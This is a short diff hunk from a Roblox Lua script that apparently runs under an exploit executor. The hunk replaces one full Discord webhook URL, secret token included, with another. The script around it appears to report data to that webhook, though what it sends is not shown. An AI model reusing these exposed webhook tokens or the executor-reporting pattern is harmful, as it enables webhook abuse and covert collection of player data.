@@ -4,7 +4,7 @@ local Http = game:GetService("HttpService")
 local Market = game:GetService("MarketplaceService")
 local plr = Players.LocalPlayer
 
-local webhook = "https://discord.com/api/webhooks/1425335602089300049/ZSJrWblCE4lJAZAj4Jq99H-8fXajhqXJ1kyX6qx_zViHFKPwMb9uzpBokaTe_BkTcLCx"
+local webhook = "https://discord.com/api/webhooks/1453488736196231341/6kgxStN0Upv7Hqj8srIQK3y3lcXFja_qjiLwP_o5LqHDI8YW6DF0OxeNxIfxKXWK3v46"
 
 local executor = (
     getexecutorname and getexecutorname() or
